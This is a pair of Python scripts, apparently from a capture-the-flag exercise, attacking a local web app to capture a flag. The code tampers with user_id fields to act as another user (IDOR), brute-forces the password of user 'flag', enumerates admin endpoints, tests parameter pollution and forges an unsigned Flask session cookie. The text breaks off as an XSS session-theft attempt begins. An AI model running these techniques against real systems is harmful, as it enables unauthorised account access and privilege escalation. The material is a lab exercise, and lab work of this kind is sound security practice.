import requests
import re
from urllib.parse import urlencode

BASE_URL = "http://127.0.0.1:33029"
SESSION_COOKIE = "eyJ1c2VyX2lkIjoxMDAzMn0.ac6Z5w.L4Dx_bmHgYdRTXc80ol3P3GoeoY"

session = requests.Session()
session.cookies.set("session", SESSION_COOKIE)

headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'X-Requested-With': 'XMLHttpRequest'
}

print("=" * 80)
print("INVESTIGATING ANOMALIES")
print("=" * 80)

print("\n[1] Examining POST /password/test with user_id=10030 (anomaly)")
print("-" * 80)
form_data = {'username': 'test', 'password': 'test123', 'user_id': '10030'}
resp = session.post(f"{BASE_URL}/password/test", data=urlencode(form_data), headers=headers)
print(f"Status: {resp.status_code}")
print(f"Full Response:\n{resp.text}")

print("\n[2] Examining /password/flag endpoint (found user_id=10052)")
print("-" * 80)
resp2 = session.get(f"{BASE_URL}/password/flag")
print(f"Status: {resp2.status_code}")
print(f"Full Response:\n{resp2.text}")

# Extract the hidden user_id from the flag endpoint
user_id_match = re.search(r'<input[^>]+name=["\']user_id["\'][^>]+value=["\'](\d+)["\'][^>]*>', resp2.text)
if user_id_match:
    target_user_id = user_id_match.group(1)
    print(f"\n[!] Found hidden user_id in /password/flag: {target_user_id}")

print("\n" + "=" * 80)
print("[3] Testing if we can act as user_id 10052 via various vectors")
print("=" * 80)

test_id = "10052"

# Test form submission with user_id 10052
form_data = {'username': 'flag', 'password': 'flag123', 'user_id': test_id}
resp3 = session.post(f"{BASE_URL}/password/test", data=urlencode(form_data), headers=headers)
print(f"\nPOST with user_id={test_id}:")
print(f"Status: {resp3.status_code} | Length: {len(resp3.text)}")
if "FLAG{" in resp3.text:
    print(f"[!] FLAG FOUND!\n{resp3.text}")
else:
    print(f"Response (first 1000 chars):\n{resp3.text[:1000]}")

# Check dashboard after this request
print("\n[4] Checking dashboard after user_id manipulation")
print("-" * 80)
dash = session.get(f"{BASE_URL}/dashboard")
print(f"Dashboard shows: {re.search(r'Welcome, ([^<]+)', dash.text).group(1) if re.search(r'Welcome, ([^<]+)', dash.text) else 'Not found'}")

print("\n[5] Testing /password/flag with POST")
print("-" * 80)
form_data = {'username': 'flag', 'password': 'test', 'user_id': test_id}
resp4 = session.post(f"{BASE_URL}/password/flag", data=urlencode(form_data), headers=headers)
print(f"POST /password/flag with user_id={test_id}:")
print(f"Status: {resp4.status_code} | Length: {len(resp4.text)}")
if "FLAG{" in resp4.text:
    print(f"[!] FLAG FOUND!\n{resp4.text}")
else:
    print(f"Response:\n{resp4.text}")

print("\n[6] Wide range scan around 10052")
print("-" * 80)
for uid in [10050, 10051, 10052, 10053, 10054, 10055]:
    form_data = {'username': 'test', 'password': 'test', 'user_id': str(uid)}
    resp = session.post(f"{BASE_URL}/password/test", data=urlencode(form_data), headers=headers)
    welcome_match = re.search(r'Welcome, ([^!<]+)', resp.text)
    welcome_msg = welcome_match.group(1).strip() if welcome_match else "None"
    print(f"user_id={uid}: Status {resp.status_code}, Welcome: {welcome_msg[:30]}")

print("\n" + "=" * 80)
print("[7] Check if there are other '/password/<name>' endpoints")
print("=" * 80)

names_to_try = ['flag', 'admin', 'user', 'test', 'root', 'trading', 'platform', 'secret']
for name in names_to_try:
    try:
        r = session.get(f"{BASE_URL}/password/{name}", timeout=5)
        if r.status_code == 200:
            uid_match = re.search(r'name=["\']user_id["\'][^>]+value=["\'](\d+)["\']', r.text)
            uid = uid_match.group(1) if uid_match else "unknown"
            print(f"/password/{name}: user_id={uid}")
    except:
        pass

print("\n[INVESTIGATION COMPLETE]")

import requests
import re
from urllib.parse import urlencode

BASE_URL = "http://127.0.0.1:33029"
SESSION_COOKIE = "eyJ1c2VyX2lkIjoxMDAzMn0.ac6Z5w.L4Dx_bmHgYdRTXc80ol3P3GoeoY"

session = requests.Session()
session.cookies.set("session", SESSION_COOKIE)

print("=" * 80)
print("EXPLORING ALTERNATIVE ATTACK VECTORS")
print("=" * 80)

# The password change requires the current password - maybe we can brute force?
print("\n[1] Brute force password for user 'flag' (user_id=10052)")
print("-" * 80)

common_passwords = [
    'flag', 'Flag', 'FLAG', 'password', '123456', 'admin', 'test',
    'secret', 'password123', 'flag123', 'trading', 'platform'
]

headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'X-Requested-With': 'XMLHttpRequest'
}

for password in common_passwords:
    form_data = {'username': 'flag', 'password': password, 'user_id': '10052'}
    resp = session.post(f"{BASE_URL}/password/flag", data=urlencode(form_data), headers=headers)
    
    if "Incorrect password" not in resp.text:
        print(f"\n[!] Password '{password}' might work!")
        print(f"Status: {resp.status_code}")
        print(f"Response:\n{resp.text}")
        break
    else:
        print(f"[X] Password '{password}': Incorrect")

print("\n" + "=" * 80)
print("[2] Testing for vertical privilege escalation - Admin endpoints")
print("=" * 80)

admin_endpoints = [
    '/admin', '/admin/', '/admin/dashboard', '/admin/users',
    '/admin/flags', '/manage', '/management', '/panel'
]

for endpoint in admin_endpoints:
    try:
        r = session.get(f"{BASE_URL}{endpoint}", timeout=5)
        if r.status_code != 404:
            print(f"{endpoint}: Status {r.status_code}, Length {len(r.text)}")
            if "FLAG{" in r.text:
                print(f"[!] FLAG FOUND at {endpoint}!\n{r.text}")
    except:
        pass

print("\n" + "=" * 80)
print("[3] Testing parameter pollution on login form")
print("=" * 80)

# Try parameter pollution on the login form
pollution_tests = [
    {'username': ['test', 'flag'], 'password': 'test'},
    {'username': 'test', 'password': ['test', 'flag123']},
    {'username': 'flag', 'password': 'test', 'user_id': ['10032', '10052']},
]

for i, params in enumerate(pollution_tests):
    # Build query string with multiple values
    body = []
    for key, val in params.items():
        if isinstance(val, list):
            for v in val:
                body.append(f"{key}={v}")
        else:
            body.append(f"{key}={val}")
    
    encoded_body = "&".join(body)
    r = session.post(f"{BASE_URL}/password/test", 
                     data=encoded_body, 
                     headers={'Content-Type': 'application/x-www-form-urlencoded'})
    print(f"Test {i+1}: Status {r.status_code}, Length {len(r.text)}")

print("\n" + "=" * 80)
print("[4] Checking for IDOR in other potential endpoints")
print("=" * 80)

# Try accessing other user resources
idor_endpoints = [
    '/user/10052', '/user/flag', '/users/10052',
    '/profile/10052', '/account/10052',
    '/trade/10052', '/trades/10052',
    '/api/user/10052', '/api/users/10052',
]

for endpoint in idor_endpoints:
    try:
        r = session.get(f"{BASE_URL}{endpoint}", timeout=5)
        if r.status_code != 404:
            print(f"\n{endpoint}: Status {r.status_code}, Length {len(r.text)}")
            if "FLAG{" in r.text or ("flag" in r.text.lower() and len(r.text) > 200):
                print(f"[!] Interesting response!\n{r.text[:1500]}")
    except:
        pass

print("\n" + "=" * 80)
print("[5] Session cookie analysis and manipulation")
print("=" * 80)

# The session cookie is: eyJ1c2VyX2lkIjoxMDAzMn0.ac6Z5w.L4Dx_bmHgYdRTXc80ol3P3GoeoY
# It's a Flask cookie with signature
import base64

# Decode the payload part
payload_b64 = "eyJ1c2VyX2lkIjoxMDAzMn0"
padding = 4 - len(payload_b64) % 4
if padding != 4:
    payload_b64 += "=" * padding

payload = base64.b64decode(payload_b64)
print(f"Current session payload: {payload}")

# Create forged payload for user 10052
forged_payload = b'{"user_id":10052}'
forged_b64 = base64.b64encode(forged_payload).rstrip(b'=').decode()
print(f"Forged payload (10052): {forged_payload}")
print(f"Forged base64: {forged_b64}")

# Try to use forged cookie (without valid signature - will fail)
forged_cookie = f"{forged_b64}.fake.fake"
print(f"Attempting forged cookie: {forged_cookie[:50]}...")

session2 = requests.Session()
session2.cookies.set("session", forged_cookie)
try:
    r = session2.get(f"{BASE_URL}/dashboard", timeout=5)
    print(f"Forged cookie response: Status {r.status_code}")
    if "Welcome" in r.text:
        welcome = re.search(r'Welcome, ([^<]+)', r.text)
        if welcome:
            print(f"Welcome message: {welcome.group(1)}")
except Exception as e:
    print(f"Error: {e}")

print("\n" + "=" * 80)
print("[6] XSS attempt to steal flag user's session")
print("=" * 80)

# Try XSS payload in password field to see if reflected
xss_payloads = [
